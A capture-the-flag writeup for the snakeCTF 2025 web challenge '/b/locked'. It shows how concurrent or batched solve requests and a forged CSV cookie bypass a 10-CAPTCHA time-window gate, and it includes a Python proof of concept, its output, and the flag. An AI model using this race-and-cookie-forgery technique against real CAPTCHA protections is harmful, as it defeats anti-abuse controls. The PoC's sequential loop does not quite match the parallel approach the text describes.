---
title: "/b/locked - snakeCTF 2025 Quals"
category: "web"
subcategory: "race"
type: "writeup"
tags: ["web", "race-condition", "captcha", "sqlite", "nodejs", "race", "snakectf-2025-quals", "2025", "ctf-writeup"]
summary: "/b/locked implements a custom CAPTCHA gate where you must solve 10 challenges in ≤10 seconds to view the protected page."
source:
  name: "CTFtime writeup #40423"
  url: "https://ctftime.org/writeup/40423"
original_source: "https://blog.hitc.at/posts/ctf/snakectf-2025/blocked/"
ctf:
  name: "snakeCTF 2025 Quals"
  year: 2025
  challenge: "/b/locked"
---

## Metadata

- **CTF:** snakeCTF 2025 Quals
- **Task:** /b/locked
- **Author team:** fish3r
- **CTFtime tags:** web, race-condition, captcha
- **CTFtime:** <https://ctftime.org/writeup/40423>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/snakectf-2025/blocked/>

---
## Introduction

*/b/locked* implements a custom CAPTCHA gate where you must solve **10** challenges in **≤10 seconds** to view the protected page. The server-side flow introduces a **race condition**: validation and cleanup aren’t atomic, and the protected page only checks timestamps across tokens. By **bursting concurrent `/api/solve` requests**, we can accumulate 10 valid tokens inside the window and pass the gate.

### Context Explanation

* **Stack:** Node.js/Express + SQLite; front-end EJS.  
* **Goal:** Get 10 verified “solve tokens” whose `solvedAt` fit within a 10-second window, then load `/protected`.  
* **Security controls present:**

* `crypto.timingSafeEqual` for solution comparison.  
* Per-solve tokens hashed with PBKDF2 (100k) + salt and verified server-side.  
* Tokens expected in cookie.  
* Time-window verification across token timestamps.

Key constants in `src/index.js`:

```js  
const CAPTCHA_COUNT_REQUIRED = 10;  
const TIME_LIMIT_SECONDS = 10;  
```

### Directive

Exploit the race by **parallelizing solver requests** to `/api/solve` so that 10 tokens share a narrow `solvedAt` span (≤10s), then craft the cookie and fetch `/protected`.

\---

## Solution

### 1) Surface & Data Flow (server code)

**Generate challenge** (`/api/captcha`): solution is stored server-side.

```js  
// src/lib/captcha.js  
return {  
solution: fullText,  
foreground: ...,  
background: ...  
};

// src/index.js  
db.run("INSERT INTO captchas (id, solution, createdAt) VALUES (?, ?, ?)",  
[captchaId, captchaData.solution, Date.now()]);  
```

**Solve challenge** (`/api/solve`): constant-time compare, token issuance, then row deletion (non-atomic chain).

![Captcha](<https://blog.hitc.at/images/snakectf2025/web/blocked_captcha.png#center>)

```js  
// src/index.js  
const solutionBuffer = Buffer.from(solution.toLowerCase());  
const storedSolutionBuffer = Buffer.from(storedCaptcha.solution.toLowerCase());  
const isCorrect = solutionBuffer.length === storedSolutionBuffer.length &&  
crypto.timingSafeEqual(solutionBuffer, storedSolutionBuffer);  
if (!isCorrect) return res.status(400).json({ success:false });

const solvedAt = Date.now(); // <\-- timestamp captured BEFORE heavy PBKDF2  
const token = crypto.randomBytes(16).toString('hex');  
const salt = crypto.randomBytes(16).toString('hex');

const hash = await new Promise((resolve, reject) => {  
crypto.pbdkf2(token, salt, 100000, 64, "sha512", (err, dk) => {  
if (err) reject(err);  
else resolve(dk.toString('hex'));  
});  
});

db.run("INSERT INTO validHashes (id, hash, salt, solvedAt, createdAt) VALUES (?, ?, ?, ?, ?)",  
[token, hash, salt, solvedAt, Date.now()]);

// Cookie update (server writes JSON array)  
let solvedCaptchas = [];  
try { solvedCaptchas = JSON.parse(req.cookies.solvedCaptchas || '[]'); } catch(e) { solvedCaptchas = []; }  
solvedCaptchas.push(token);  
res.cookie('solvedCaptchas', JSON.stringify(solvedCaptchas), { httpOnly: true, secure: false });

// Cleanup happens AFTER validation/issuance  
db.run("DELETE FROM captchas WHERE id = ?", [captchaId]);  
```

![Captcha API](<https://blog.hitc.at/images/snakectf2025/web/blocked_captcha_api.png#center>)

**Race window:** multiple concurrent `/api/solve` for the same `captchaId` can pass validation before the row is deleted. Also, `solvedAt` is captured before PBKDF2, keeping timestamps tight.

**Protected page** (`/protected`): verifies 10 tokens and enforces the ≤10s window.

```js  
// src/index.js (cookie format inconsistency noted below)  
let solvedCaptchas = req.cookies.solvedCaptchas.split(',').map(t => t.trim()); // <\-- expects CSV here  
...  
db.get("SELECT hash, salt, solvedAt FROM validHashes WHERE id = ?", [token], ...);  
// recompute PBKDF2(token, salt) and timingSafeEqual with stored hash  
...  
solvedTimes.sort((a,b) => a-b);  
const timeElapsed = (solvedTimes[solvedTimes.length-1] - solvedTimes[0]) / 1000;  
if (timeElapsed <= TIME_LIMIT_SECONDS) render flag;  
```

> Note the **cookie mismatch**: `/api/solve` writes JSON, but `/protected` reads **CSV**. We’ll exploit this by **forging the Cookie header** with a comma-separated list of tokens.

\---

### 2) Exploitation Strategy

We need **10 valid tokens** with `solvedAt` tightly clustered.

Two workable approaches:

**A) True race on a single CAPTCHA (TOCTOU)**

* Fetch **one** CAPTCHA and its solution.  
* Fire **≥10** concurrent `POST /api/solve` with the **same** `{captchaId, solution}` before `DELETE FROM captchas` lands.  
* Each request issues a distinct token (and stores `solvedAt` near-identically).  
* Build a **CSV** cookie: `solvedCaptchas=token1,token2,...,token10`.  
* `GET /protected` → flag.

> This is the official solution proposed by the challenge author here: <https://snakectf.org/writeups/2025-quals/web/blocked>

**B) Parallelize across multiple CAPTCHAs**

* Pre-solve N captchas (or obtain their solutions), then **submit all in parallel**.  
* Also yields ≤10s span across tokens thanks to concurrency.

**POC :**

```python  
import requests  
import json  
import urllib.parse

BASE = "<https://0501d746d5e0d28cf2ba5004bbd0f0bd.blocked.challs.snakectf.org/>"

# Solve them manually without validating them and store the solution here  
CAPTCHAS = {  
"6de6162a9274b129823ba174" : "DCDRB2",  
"647ae4bd013aadadb9f87528" : "42GVD8",  
"269e7baedaeff2321a484d0f" : "UAS9G8",  
"faef1cd97abdd8212820b70f" : "DCN6XE",  
"a376c6e3f0d24d33ef985786" : "BTFMTS",  
"710ef950f9ddee539a6c058b" : "HSNRGS",  
"7a26b43dcb75da0d8122a9d7" : "7785P3",  
"c8a032e00f036b2b4916e950" : "9Q5GX9",  
"1809530bc3e9314ba902344b" : "23J6LS",  
"146dbd4b2c08c69fdee7bcd7" : "5KXP9Q",  
"ebee0e6a13d62cbe1b32b21f" : "SWDXVH",  
"02b12fdfcadc0af1ee92aa7b" : "2X2DFN",  
"43b0e0d636a402433c5dc586" : "76CPCD",  
"715d1d17d8f2d5f07e60cfd5" : "EWFHQU",  
"49c5c8d7008847205d40cf95" : "DVNDDX",  
}

session = requests.Session()

all_tokens = []

# Solve all captchas and collect tokens  
for cid, sol in CAPTCHAS.items():  
print(f"[+] Solve {cid} with {sol}")  
r = [session.post](http://session.post)(  
f"{BASE}/api/solve",  
json={"captchaId": cid, "solution": sol},  
)  
  
if "set-cookie" in r.headers and r.status_code == 200:  
sc = r.headers["set-cookie"]  
if sc.lower().startswith("solvedcaptchas="):  
cookie_val = sc.split(";",1)[0].split("=",1)[1]  
decoded = urllib.parse.unquote(cookie_val)  
try:  
arr = json.loads(decoded)  
all_tokens = arr  
except Exception as e:  
print("Cookie parse error:", e)

print("\n[+] Tokens collected :", all_tokens)

csv_tokens = "solvedCaptchas=" + ",".join(all_tokens)  
print("[+] Header solvedCaptchas :", csv_tokens)

# Access protected page  
session.headers.update({'Cookie' : csv_tokens})  
r = session.get(f"{BASE}/protected")

# Retrieve flag  
print("\n[+] Protected page content:")  
print(r.text)  
```

```bash  
# Output  
[+] Solve 6de6162a9274b129823ba174 with DCDRB2  
[+] Solve 647ae4bd013aadadb9f87528 with 42GVD8  
[+] Solve 269e7baedaeff2321a484d0f with UAS9G8  
[+] Solve faef1cd97abdd8212820b70f with DCN6XE  
[+] Solve a376c6e3f0d24d33ef985786 with BTFMTS  
[+] Solve 710ef950f9ddee539a6c058b with HSNRGS  
[+] Solve 7a26b43dcb75da0d8122a9d7 with 7785P3  
[+] Solve c8a032e00f036b2b4916e950 with 9Q5GX9  
[+] Solve 1809530bc3e9314ba902344b with 23J6LS  
[+] Solve 146dbd4b2c08c69fdee7bcd7 with 5KXP9Q  
[+] Solve ebee0e6a13d62cbe1b32b21f with SWDXVH  
[+] Solve 02b12fdfcadc0af1ee92aa7b with 2X2DFN  
[+] Solve 43b0e0d636a402433c5dc586 with 76CPCD  
[+] Solve 715d1d17d8f2d5f07e60cfd5 with EWFHQU  
[+] Solve 49c5c8d7008847205d40cf95 with DVNDDX

[+] Tokens collected : ['611163829b6ec365d4ecb1861f138805', '5aa39ff94d2bf9c6def79e60f6e29cd1', 'a586b16a935b366d8a0499d692947e0a', 'b5238c6b61c1ae6d7afb9c0e5161ccb6', 'e0634c217e2c71591cc70ec3dfcfbcc6', '6b5542e2e4a9fbfcf7022e2d291ee161', '2518821767aa4fb35934bf8532256c48', 'b96262ae8713282c5005d60134a1ac5d', '004d683892b95bcbf2f8dbbef13c5b75', 'e91b33f4977148364ff83a48cda7a9d1', '6611d6657adea4ac9cfab1af038620eb', 'f398fffc2ee2555e8ae6af2655e0b4f1']  
[+] Header solvedCaptchas : solvedCaptchas=611163829b6ec365d4ecb1861f138805,5aa39ff94d2bf9c6def79e60f6e29cd1,a586b16a935b366d8a0499d692947e0a,b5238c6b61c1ae6d7afb9c0e5161ccb6,e0634c217e2c71591cc70ec3dfcfbcc6,6b5542e2e4a9fbfcf7022e2d291ee161,2518821767aa4fb35934bf8532256c48,b96262ae8713282c5005d60134a1ac5d,004d683892b95bcbf2f8dbbef13c5b75,e91b33f4977148364ff83a48cda7a9d1,6611d6657adea4ac9cfab1af038620eb,f398fffc2ee2555e8ae6af2655e0b4f1  
<style>  
* {  
color: #789922;  
}  
</style>

```
    > be me  
    > 19 year old NEET  
    > decide to try this CTF challenge  
    > sounds ez enough, just solve some captchas kek  
    > click start  
    > 10 captchas in 10 seconds  
    > wut.jpg  
    > first captcha looks like abstract art made by a toddler  
    > squint at screen like I\'m trying to decipher hieroglyphs  
    > type \"Q8XN2M\"  
    > wrong  
    > try \"08XN2M\"  
    > still wrong  
    > hyperfocus mode activated  
    > 9 captchas left, already 5 seconds gone  
    > frantically mashing refresh button  
    > sweating tendies  
    > timer hits zero  
    > youreoutoftime.exe  
    > stare at screen having a mental breakdown  
    > try again  
    > same result  
    > and again  
    > starting to question if I\'m actually human  
    > maybe I should just go back to /g/ and seethe about programming languages  
    > other anons probably solving this ez pz  
    > meanwhile I'm here getting absolutely rekt by squiggly lines  
    > mfw i realize i could have gone outside and touched grass instead of this  
    > mfw i realize a 6 year old could probably solve this faster than me  
    > mfw the flag is literally snakeCTF{4n0n_byp4553d_th3_f1lt3r_4543ad7fe7e2f82a}  
    > mfw there is a song for this challenge  
    > bleeding_ears.mp3  
```

<iframe  
width="560"  
height="315"  
src="<https://www.youtube.com/embed/Af8knRyzQpI?si=M9FPVFUX_feGo85->"  
title="YouTube video player"  
frameborder="0"  
allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"   
referrerpolicy="strict-origin-when-cross-origin"  
allowfullscreen  
></iframe>  
```
